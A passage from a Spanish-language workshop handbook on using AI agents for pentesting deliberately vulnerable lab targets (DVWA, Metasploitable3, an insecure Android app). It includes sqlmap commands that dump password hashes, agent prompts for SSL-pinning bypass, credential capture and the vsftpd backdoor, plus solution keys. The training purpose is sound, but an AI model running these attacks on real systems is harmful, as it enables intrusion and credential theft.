- Título: SQL Injection in DVWA User Input
- Severidad: Critical
- CVSS: calcula automáticamente
- Evidencia: incluye la salida de sqlmap
- Remediación: prepared statements, input validation, WAF
```

#### Paso 5: Generar Reporte (10 min)

```bash
python3 core/scripts/report_generate.py \
  --engagement lab-02-dvwa \
  --template technical_finding \
  --output reports/lab-02-sqli-report.md
```

#### Criterios de Validación

| ✅ Criterio | Descripción |
|-------------|-------------|
| SQLi confirmada | El agente confirmó y explotó la inyección |
| DB enumerada | Al menos 2 bases de datos identificadas |
| Users dumpeados | Tabla users con hashes expuestos |
| Evidencia capturada | Screenshot/output guardado con evidence-mcp |
| CVSS calculado | Score numérico asignado correctamente |
| Reporte generado | Archivo markdown/html con el hallazgo |

---

### Lab 3: Mobile — Frida MCP (30 min)

**Objetivo:** Comprender la instrumentación dinámica de apps Android con Frida MCP. *(Demo guiado por el instructor + ejercicios)*

> **Nota:** Este lab requiere un dispositivo Android rooteado. Si no tienes uno, trabaja en parejas con el dispositivo del instructor.

#### Paso 1: Configuración del Entorno (5 min)

```bash
# Verificar ADB
adb devices
# Esperado: List of devices attached + 1 device

# Verificar Frida server
adb shell "su -c 'ps | grep frida-server'"
# Esperado: proceso frida-server corriendo

# Clonar kahlo-mcp
cd ~
git clone https://github.com/FuzzySecurity/kahlo-mcp.git
cd kahlo-mcp
npm install && npm run build
```

#### Paso 2: Configurar kahlo-mcp (5 min)

Edita `kahlo-mcp/config.json`:

```json
{
  "transport": "stdio",
  "logLevel": "info",
  "dataDir": "./data",
  "adbPath": "/usr/bin/adb"
}
```

Agrega a `.opencode.json`:

```json
{
  "mcpServers": {
    "frida-kahlo": {
      "command": "node",
      "args": ["/home/kali/kahlo-mcp/dist/index.js"],
      "cwd": "/home/kali/kahlo-mcp"
    }
  }
}
```

#### Paso 3: Descubrimiento y Análisis (10 min)

```
Usa kahlo-mcp para:
1. Listar dispositivos conectados (kahlo_devices_list)
2. Verificar salud del dispositivo (kahlo_devices_health)
3. Listar procesos corriendo (kahlo_processes_list)
4. Identificar la aplicación objetivo: com.example.insecureapp
```

#### Paso 4: Instrumentación (10 min)

```
Usa kahlo-mcp para instrumentar com.example.insecureapp:
1. Spawnea la app con mode=spawn
2. Crea un job que intercepte las llamadas a SharedPreferences
3. Captura credenciales almacenadas en plaintext
4. Exporta los artefactos como evidencia
```

#### Ejemplo de Bypass de SSL Pinning

Prompt para el agente:

```
Usa kahlo-mcp para bypassear SSL pinning en com.example.insecureapp:

1. Spawnea la app (mode=spawn, gating=spawn)
2. Inicia un job daemon que:
   - Hook a javax.net.ssl.TrustManager
   - Hook a okhttp3.CertificatePinner
   - Deshabilite la verificación de certificados
3. Confirma que el tráfico HTTPS ahora es interceptable
4. Captura la confirmación como evidencia
```

#### Criterios de Validación

| ✅ Criterio | Descripción |
|-------------|-------------|
| Dispositivo detectado | `kahlo_devices_list` muestra el dispositivo |
| Procesos listados | `kahlo_processes_list` muestra apps |
| Target instrumentado | App spawneada o attacheada exitosamente |
| Hook ejecutado | Job creado y ejecutado sin errores |
| Evidencia capturada | Artefacto o evento capturado |

---

### Lab 4: Engagement Completo (45 min)

**Objetivo:** Ejecutar un engagement completo de principio a fin, usando múltiples agentes, capturando evidencia, y generando un reporte HTML profesional.

#### Paso 1: Iniciar Engagement (3 min)

```
/engage full-lab --scope scope.txt --type full
```

#### Paso 2: Recon Multilateral (7 min)

```
Como Recon Specialist, realiza reconocimiento de ambos objetivos:

Objetivo 1: 192.168.56.101 (DVWA - web)
  - Nmap con detección de servicios
  - Enumeración de directorios web
  - Identificación de tecnologías

Objetivo 2: 192.168.56.102 (Metasploitable3 - infra)
  - Nmap con scripts de vulnerabilidad
  - Enumeración de servicios SMB
  - Detección de sistema operativo

Resume la superficie de ataque combinada de ambos objetivos.
Captura toda la salida como evidencia RECON-001.
```

#### Paso 3: Explotación Web (10 min)

```
Como Web Attacker, ataca 192.168.56.101:

1. Confirma y explota la SQL injection en /vulnerabilities/sqli/
2. Intenta explotar XSS reflejado en /vulnerabilities/xss_r/
3. Prueba command injection en /vulnerabilities/cmd/
4. Para cada hallazgo exitoso:
   - Captura evidencia con evidence-mcp
   - Asigna CVSS
   - Documenta el paso a paso de explotación
```

#### Paso 4: Explotación de Infraestructura (10 min)

```
Como Network Operator, ataca 192.168.56.102:

1. Enumera shares SMB: enum4linux -a 192.168.56.102
2. Intenta acceso SMB con credenciales por defecto
3. Verifica vulnerabilidades de Vsftpd 2.3.4 (backdoor)
4. Si obtienes acceso, captura /etc/passwd como evidencia

Documenta cada hallazgo con evidence-mcp.
```

#### Paso 5: Generación de Reporte (10 min)

```
Genera un reporte completo del engagement usando report-mcp:

1. Crea el reporte: engagement "Full Lab Engagement"
2. Agrega todos los hallazgos encontrados (RECON-001, SQL-001, XSS-001, CMD-001, SMB-001, etc.)
3. Genera el reporte en formato HTML con template "client"
4. Verifica que el reporte incluye:
   - Resumen ejecutivo
   - Cada hallazgo con CVSS, descripción, evidencia, remediación
   - Tabla de hallazgos resumida
```

```bash
# Alternativa por CLI:
python3 core/scripts/report_generate.py \
  --engagement full-lab \
  --template client \
  --output reports/full-lab-report.html
```

#### Paso 6: Verificación Final (5 min)

Abre el reporte HTML y verifica:

| ✅ Elemento | Presente |
|-------------|----------|
| Portada con nombre del engagement |  |
| Resumen ejecutivo |  |
| Tabla de hallazgos |  |
| ≥5 hallazgos con CVSS |  |
| Evidencia incrustada o referenciada |  |
| Recomendaciones de remedio por hallazgo |  |
| Formato profesional HTML |  |

---

## 6. Proyectos y Recursos de Referencia

### 6.1 Ecosistema 2026

#### Frameworks y Herramientas

| Proyecto | Descripción | URL |
|----------|-------------|-----|
| **ThreatSwarm** | 32 agentes para pentesting multi-plataforma | github.com/vsh00t/ThreatSwarm |
| **pentest-ai-agents** | 31 subagentes Claude Code para pentesting | github.com/0xSteph/pentest-ai-agents |
| **pentest-ai** | MCP server + 150+ tool wrappers en Python | github.com/0xSteph/pentest-ai |
| **communitytools** | Claude Code skills para pentesting (TransilienceAI) | github.com/transilienceai/communitytools |

#### MCP Servers para Seguridad

| Proyecto | Descripción | URL |
|----------|-------------|-----|
| **Burp MCP Server** | Extensión oficial de Burp Suite (PortSwigger, Feb 2026) | github.com/PortSwigger/mcp-server |
| **kahlo-mcp** | Frida MCP para instrumentación Android (FuzzySecurity) | github.com/FuzzySecurity/kahlo-mcp |
| **frida-c2-mcp** | Frida on-device MCP para Android/iOS (s4dp4nd4) | github.com/s4dp4nd4/frida-c2-mcp |
| **MCPwned** | Extensión de Burp para auditar MCP servers (Fenrisk) | github.com/FenriskSecurity/MCPwned |

#### Comparación Rápida

| Feature | ThreatSwarm | pentest-ai-agents | Burp MCP |
|---------|-------------|-------------------|----------|
| Agentes especializados | 32 | 31 | N/A (herramientas) |
| Multi-plataforma | Claude + Copilot + OpenCode + OpenClaw | Claude Code only | Cualquier cliente MCP |
| MCP servers incluidos | 3 (scope, evidence, report) | 1 (pentest-ai MCP con 150+ tools) | 1 (Burp como herramienta) |
| Dependencias | Cero (solo archivos .md) | Cero (solo archivos .md) | Java + Burp Suite Pro |
| Enfoque | Framework completo | Subagentes especializados | Integración con Burp |
| Licencia | MIT | MIT | BSD-3-Clause |

---

### 6.2 Lecturas Recomendadas

#### Seguridad de Agentes de IA

- **Anthropic — Claude Code Security (Feb 2026):** El Frontier Red Team de Anthropic publicó hallazgos de seguridad sobre Claude Code, incluyendo escenarios de excessive agency y data exfiltration. Lectura obligatoria para entender los riesgos de los agentes autónomos.

- **OWASP Top 10 for LLM Applications (2025):** Lista de los 10 riesgos más críticos en aplicaciones LLM: prompt injection, insecure output handling, training data poisoning, model denial of service, supply chain vulnerabilities, sensitive information disclosure, insecure plugins, excessive agency, prompt injection (indirect), y vector/embedding weaknesses.

- **MITRE ATLAS:** Framework de conocimiento de adversarios para sistemas de IA. Mapea tácticas y técnicas usadas para atacar sistemas de IA, análogo a MITRE ATT&CK.

#### MCP y Seguridad

- **MCPwned (Fenrisk, Abr 2026):** Extensión de Burp Suite para auditar MCP servers. ~100,000 resultados de "MCP" en Shodan. La publicación detalla cómo encontrar y explotar MCP servers expuestos, incluyendo command injection a través de herramientas MCP mal validadas.

- **Bloomberry — Analysis of 1,400 MCP Servers:** Investigación que analizó 1,400 servidores MCP públicos, encontrando patrones comunes de mala configuración, falta de autenticación, y exposición de herramientas sensibles.

#### Pentesting con IA

- **Semgrep — AI Agents Finding Vulnerabilities:** Casos de estudio de agentes de IA descubriendo vulnerabilidades reales en código de producción.

- **NSFOCUS — Claude Code Security Insights:** Análisis detallado de las capacidades ofensivas de Claude Code y cómo los atacantes podrían explotarlas.

---

### 6.3 Comunidad

#### Reddit

| Subreddit | Tema |
|-----------|------|
| r/netsec | Noticias de seguridad, herramientas, research |
| r/cybersecurity | Discusión general de ciberseguridad |
| r/pentest | Pentesting, técnicas, career |
| r/pentesting | Pentesting práctico |
| r/AgentSec | Agentes de IA en seguridad (emergente) |

#### Discord

- **Pentest People** — Comunidad activa de pentesters
- **HackerOne** — Bug bounty y disclosure responsable
- **THM (TryHackMe) Community** — Aprendizaje práctico

#### GitHub

- **ThreatSwarm Discussions:** github.com/vsh00t/ThreatSwarm/discussions
- **pentest-ai-agents Issues:** github.com/0xSteph/pentest-ai-agents/issues
- **Claude Code Community:** Anthropic Developer Forum

#### Conferencias

- **DEF CON** (Las Vegas, Agosto) — Presentaciones sobre IA y seguridad
- **Black Hat** (Las Vegas, Agosto) — Briefings técnicos
- **OWASP Global AppSec** — Varias sedes, incluye track de LLM security

---

## 7. Soluciones de los Laboratorios

---

### Lab 1: Solución — Primer Escaneo con IA

#### Comandos Esperados del Agente

```bash
# Paso 1: Verificar scope
# (Agente llama a scope-mcp: validate_target)

# Paso 2: Nmap scan
nmap -sV -sC -p- --open 192.168.56.101

# Salida esperada:
# PORT     STATE SERVICE  VERSION
# 22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1
# 80/tcp   open  http     Apache httpd 2.4.41
# 3306/tcp open  mysql    MySQL 5.5.62-0ubuntu0.20.04.1

# Paso 3: Gobuster
gobuster dir -u http://192.168.56.101 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 20 --no-error -x php,txt

# Salida esperada (parcial):
# /vulnerabilities      (Status: 302)
# /login                (Status: 200)
# /setup.php            (Status: 200)
# /security.php         (Status: 200)
# /index.php            (Status: 200)

# Paso 4: Whatweb
whatweb http://192.168.56.101

# Salida esperada:
# http://192.168.56.101 [200 OK] 
#   Apache[2.4.41], 
#   PHP[7.4.3], 
#   HTML5, 
#   IP[192.168.56.101]
```

#### Análisis Esperado del Agente

El agente debería producir un resumen estructurado que incluya:
1. **Superficie de ataque**: 3 puertos, 1 aplicación web, 1 DB expuesta
2. **Tecnologías**: Apache 2.4.41, PHP 7.4.3, MySQL 5.5.62, OpenSSH 8.2
3. **Aplicación identificada**: DVWA (Damn Vulnerable Web Application)
4. **Vectores prioritarios**:
   - MySQL 3306/tcp expuesto — probar credenciales root:root
   - DVWA — vulnerabilidades deliberadas en /vulnerabilities/
   - Apache 2.4.41 — verificar CVE-2021-41773 (path traversal)

---

### Lab 2: Solución — Pentest Web DVWA

#### Paso 1: Nuclei Scan

```bash
nuclei -u http://192.168.56.101 -t cves/ -t vulnerabilities/ -severity high,critical

# Salida esperada (parcial):
# [critical] CVE-2021-41773
# [high] xss-reflected
# [info] technologies
```

#### Paso 2: SQLMap

```bash
# Obtener PHPSESSID desde el navegador (DevTools → Application → Cookies)
sqlmap -u "http://192.168.56.101/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=tu-sesion-aqui; security=low" \
  --batch --dbs

# Salida esperada:
# available databases [5]:
# [*] dvwa
# [*] information_schema
# [*] mysql
# [*] performance_schema

# Dump tables de dvwa
sqlmap -u "http://192.168.56.101/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=tu-sesion-aqui; security=low" \
  --batch -D dvwa --tables

# Salida esperada:
# Database: dvwa
# [2 tables]
# +----------+
# | guests   |
# | users    |
# +----------+

# Dump users
sqlmap -u "http://192.168.56.101/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=tu-sesion-aqui; security=low" \
  --batch -D dvwa -T users --dump

# Salida esperada:
# Database: dvwa  Table: users
# +---------+------------------+
# | user_id | avatar           |
# +---------+------------------+
# | 1       | ...              |
# | 2       | ...              |
# +---------+------------------+
# +---------+------------------+----------------------------------+
# | user_id | user             | password                         |
# +---------+------------------+----------------------------------+
# | 1       | admin            | 5f4dcc3b5aa765d61d8327deb882cf99 |
# | 2       | gordonb          | e99a18c428cb38d5f260853678922e03 |
# | 3       | smithy           | 5f4dcc3b5aa765d61d8327deb882cf99 |
# | 4       | pablo            | 0d107d09f5bbe40cade3de5c71e9e9b7 |
# | 5       | smithy           | 5f4dcc3b5aa765d61d8327deb882cf99 |
# +---------+------------------+----------------------------------+
```

> **Nota:** `5f4dcc3b5aa765d61d8327deb882cf99` = `password` (MD5)

#### Hallazgo Esperado

```
HALLAZGO: SQL-001
Título: SQL Injection in DVWA User Input Parameter
Severidad: CRITICAL
CVSS:3.1  AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  Score: 9.8
CWE: CWE-89 (Improper Neutralization of Special Elements)
URL: http://192.168.56.101/vulnerabilities/sqli/?id=[INJECTION]
Descripción: El parámetro 'id' es vulnerable a SQL injection UNION-based.
Permite enumeración completa de bases de datos, tablas y credenciales.
Evidencia: 5 usuarios dumpeados con hashes MD5 (2 crackeados: password, abc123)
Remediación:
  - Usar prepared statements (PDO/mysqli)
  - Implementar input validation y sanitización
  - Desplegar WAF
  - Migrar a security=impossible en DVWA (usa PDO prepared statements)
```

---

### Lab 3: Solución — Frida MCP

#### Comandos Esperados (kahlo-mcp)

El agente debería llamar estas herramientas en secuencia:

```
1. kahlo_devices_list
   → [{"device_id": "emulator-5554", "model": "Pixel 6", "transport": "usb"}]

2. kahlo_devices_health
   → {"adb": true, "frida_server": true, "status": "ready"}

3. kahlo_processes_list(device_id="emulator-5554")
   → [{"pid": 1234, "name": "com.example.insecureapp"}, ...]

4. kahlo_targets_ensure(
     device_id="emulator-5554",
     package="com.example.insecureapp",
     mode="spawn",
     gating="spawn"
   )
   → {"target_id": "t-001", "status": "spawned"}

5. kahlo_jobs_start(
     target_id="t-001",
     type="oneshot",
     module={"kind": "source", "source": "<hook de SharedPreferences>"}
   )
   → {"job_id": "j-001", "status": "completed", "result": "<credentials>"}
```

---

### Lab 4: Solución — Engagement Completo

#### Resumen de Hallazgos Esperados

| ID | Hallazgo | Severidad | CVSS | Target |
|----|----------|-----------|------|--------|
| RECON-001 | Superficie de ataque mapeada | Info | — | Ambos |
| SQL-001 | SQL Injection en DVWA | Critical | 9.8 | .101 |
| XSS-001 | XSS Reflejado en DVWA | Medium | 6.1 | .101 |
| CMD-001 | Command Injection en DVWA | High | 8.8 | .101 |
| SMB-001 | SMB share accesible sin auth | High | 7.5 | .102 |
| VSFTPD-001 | Vsftpd 2.3.4 backdoor | Critical | 10.0 | .102 |

#### Comando de Reporte Final

```bash
python3 core/scripts/report_generate.py \
  --engagement full-lab \
  --template client \
  --output reports/full-lab-report.html
```

#### Verificación del Reporte

Abre `reports/full-lab-report.html` en el navegador y confirma:
- ✅ Portada con nombre del engagement y fecha
- ✅ Resumen ejecutivo con conteo de hallazgos por severidad
- ✅ Tabla de hallazgos con ID, título, severidad, CVSS
- ✅ Detalle de cada hallazgo con evidencia
- ✅ Recomendaciones de remedio
- ✅ Formato HTML profesional, navegable

---

## Notas del Estudiante

_Espacio para notas durante el taller:_

```
________________________________________________________________________

________________________________________________________________________

________________________________________________________________________

________________________________________________________________________

________________________________________________________________________

________________________________________________________________________

________________________________________________________________________

________________________________________________________________________

________________________________________________________________________

________________________________________________________________________
```

---

<div align="center">

**© 2026 Ironcybersec — Todos los derechos reservados**

*Taller: Uso de Agentes de IA para Pentest Autónomo*  
*Versión 2.0 — Abril 2026*

</div>
